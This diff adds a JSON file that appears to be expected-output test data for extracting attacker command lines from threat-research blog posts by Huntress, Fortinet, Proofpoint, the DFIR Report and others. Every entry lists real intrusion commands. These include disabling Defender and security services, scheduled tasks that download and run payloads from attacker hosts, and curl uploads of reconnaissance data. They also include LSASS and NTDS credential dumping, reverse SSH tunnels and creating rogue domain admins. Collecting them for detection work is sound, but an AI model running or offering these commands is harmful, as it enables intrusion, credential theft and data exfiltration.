@@ -1,0 +1,147 @@
+[
+  {
+    "url": "https://www.huntress.com/blog/why-old-ransomware-playbooks-never-die",
+    "expected_items": [
+      "C:\\Temp\\file.exe -n=15 -p=F",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /d \"0\"",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "reg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f",
+      "reg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f",
+      "reg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f",
+      "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Defender\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+      "bcdedit /set {current} disableelamdrivers yes",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\SYSTEM\\ControlSet001\\Services\\MsSecFlt\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "sc delete Sense",
+      "sc delete SgrmAgent",
+      "sc delete SgrmBroker",
+      "schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable"
+    ]
+  },
+  {
+    "url": "https://levelblue.com/blogs/spiderlabs-blog/malicious-screen-connect-campaign-abuses-ai-themed-lures-for-xworm-delivery",
+    "expected_items": [
+      "\"ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-keoxeq-relay[.]screenconnect[.]com&p=443&s=44f &k=BgIAAA &c=GROKgpt\"",
+      "mshta.exe (IWshShell3.Run(\"\\\"C:\\Users\\Mguise\\ONEDRI~1\\DOCUME~1\\loadding\\Temp\\X-META~1.BAT\\\" ::\\\", \\\"0\\\".\\\"))"
+    ]
+  },
+  {
+    "url": "https://www.fortinet.com/blog/threat-research/unveiling-a-new-variant-of-the-darkcloud-campaign",
+    "expected_items": [
+      "powershell -w hidden -noprofile -ep bypass -c",
+      "copy *.js C:\\Users\\Public\\Downloads\\edriophthalma.js"
+    ]
+  },
+  {
+    "url": "https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense",
+    "expected_items": [
+      "net user DC-01$ P@ssw0rd",
+      "SCCM.exe reconfig /target:[REDACTED]",
+      "C:\\windows\\system32\\openssh\\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070",
+      "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f",
+      "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f"
+    ]
+  },
+  {
+    "url": "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
+    "expected_items": [
+      "\"C:\\Windows\\System32\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"EdgeTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm woodstocktutors[.]com/jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME -OutFile C:\\Users\\public\\kwe.cc; Get-Content C:\\Users\\public\\kwe.cc | cmd\"",
+      "schtasks /create /tn \"Task-S-1-5-42121\" /f /sc minute /mo 18 /tr \"conhost --headless cmd /v:on /c set gz=ht& set gtz=tps:& set 7gg=!gz!!gtz!& set 6hg=!7gg!//p^rin^ce^cle^anit.co^m& c^ur^l !6hg!/d^prin.p^hp?dr=%computername%;%username%|c^m^d\"",
+      "\"C:\\Windows\\System32\\cmd.exe\" /start min /c schtasks /create /tn \"OneDrive\\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379\" /f /sc minute /mo 19 /tr \"conhost --headless cmd /v:on /c set 765=ht& set 665=tp:& set 565=!765!!665!& set 465=!565!//46.229.55[.]63& curl !465!/sv^c^h.p^h^p?li=%computername%..%hostname%c^m^d\" & msg * \"ERROR 0XA008CE : ERROR reading File, contents are corrupted.\"",
+      "cd C:\\programdata dir > abc1.pdf tasklist >> abc1.pdf wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get >>abc1.pdf wmic logicaldisk get caption >> abc1.pdf systeminfo >> C:\\programdata\\abc1.pdf curl -X POST -F \"file=@C:\\programdata\\abc1.pdf\" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username% del abc1.pdf",
+      "cd C:\\programdata set /P =\"MZ\" < nul >> sh1.txt curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt copy /b sh1.txt+sh2.txt shh.exe curl -o dune64.log //173.254.204[.]72/dune64.log ren dune64.log dune64.bin shh.exe dune64.bin dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\programdata\\abc1.pdf\" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username% del abc1.pdf",
+      "cd C:\\programdata net use Z: \\\\72.18.215[.]1\\tempy Z: Z:\\shl.exe dune64.bin C: net use /delete Z: /y whoami dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\programdata\\abc1.pdf\" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username% del abc1.pdf",
+      "\"C:\\Windows\\System32\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"MSTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm utizviewstation[.]com/sdf.php?fv=$env:COMPUTERNAME*$env:USERNAME -OutFile C:\\Users\\public\\documents\\vfc.cc; Get-Content C:\\Users\\public\\documents\\vfc.cc | cmd\"",
+      "tree \"%userprofile%\\Desktop\" /f > C:\\Users\\Public\\Documents\\d.log systeminfo >> C:\\Users\\Public\\Documents\\d.log WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /Format:List >> C:\\Users\\Public\\Documents\\d.log wmic logicaldisk get name >> C:\\Users\\Public\\Documents\\d.log cd C:\\Users\\Public\\Documents curl -X POST -F \"file=@d.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%computername% del d.log",
+      "curl -o C:\\ProgramData\\msuitl.tar hxxp://utizviewstation[.]com/msuitl.tar cd C:\\ProgramData tar -xvf msuitl.tar dir > t0.log msuitl.exe tasklist >> t0.log curl -X POST -F \"file=@t0.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%username% del t0.log"
+    ]
+  },
+  {
+    "url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
+    "expected_items": [
+      "ipconfig /all",
+      "ipconfig /displaydns",
+      "tasklist /svc",
+      "netstat -ano",
+      "net user /domain",
+      "net user",
+      "powershell -exec bypass -c \"Invoke-WebRequest -Uri hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile C:\\Windows\\System32\\AclNumsInvertHost.dll\"",
+      "schtasks.exe /create /SC ONLOGON /tn \"\\Microsoft\\Windows\\DefenderUPDService\" /tr \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" \\\"C:\\Windows\\system32\\AclNumsInvertHost.dll\\\",AclNumsInvertHost\"",
+      "schtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\"",
+      "schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f",
+      "schtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\"",
+      "reg.exe save HKLM\\SYSTEM \"C:\\Windows\\temp\\1\\sy.sa\" /y",
+      "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q"
+    ]
+  },
+  {
+    "url": "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
+    "expected_items": [
+      "powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg",
+      "rundll32 c:\\programdata\\COIm.jpg,init",
+      "rundll32.exe \"C:\\Users[REDACTED]\\AppData\\Roaming[REDACTED]\\Cadiak.dll\",init --od=\"DeskBlouse\\license.dat\"",
+      "C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent",
+      "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List",
+      "ipconfig /all",
+      "net config workstation",
+      "nltest /domain_trusts",
+      "nltest /domain_trusts /all_trusts",
+      "net view /all /domain",
+      "net view /all",
+      "net group \"Domain Admins\" /domain",
+      "adfind.exe -gcb -sc trustdmp",
+      "adfind.exe -f \"(objectcategory=group)\"",
+      "adfind.exe -subnets -f (objectCategory=subnet)",
+      "adfind.exe -f (objectcategory=organizationalUnit)",
+      "adfind.exe -f objectcategory=computer -csv name operatingSystem",
+      "adfind.exe -f objectcategory=computer",
+      "adfind.exe -f (objectcategory=person)",
+      "dir /s /b C:\\Windows\\system32\\*htable.xsl",
+      "net group \"domain Admins\" /domain",
+      "mkdir \"C:\\ProgramData\\Any\"",
+      "C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent",
+      "echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password"
+    ]
+  },
+  {
+    "url": "https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/",
+    "expected_items": [
+      "GT_NET.exe -m:scan -i:f -d:list.txt",
+      "Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\Public\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8",
+      "nltest /domain_trusts /all_trusts",
+      "nltest /dclist:",
+      "net group \"Domain Admins\" /domain",
+      "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED"
+    ]
+  },
+  {
+    "url": "https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/",
+    "expected_items": [
+      "nltest /dclist:",
+      "whoami /groups",
+      "net group domain admins /dom",
+      "wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include\":C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet",
+      "ssh root@193.242.184.150 -R *:10400 -p22",
+      "psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\"",
+      "for /f \"tokens=1,2 delims= \" %%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 %%B \\Windows\\Temp\\*.* full",
+      "net user backup_EA P@ssw0rd1234 /add /dom",
+      "net group \"enterprise admins\" backup_EA /add /dom"
+    ]
+  },
+  {
+    "url": "https://www.elastic.co/security-labs/roningloader",
+    "expected_items": [
+      "mklink /D \"C:\\ProgramData\\roming\" C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0",
+      "C:\\Windows\\System32\\ClipUp.exe -ppl C:\\ProgramData\\roming\\MsMpEng.exe",
+      "regsvr32.exe /S \"C:\\ProgramData\\Roning\\goldendays.dll\""
+    ]
+  }
+]
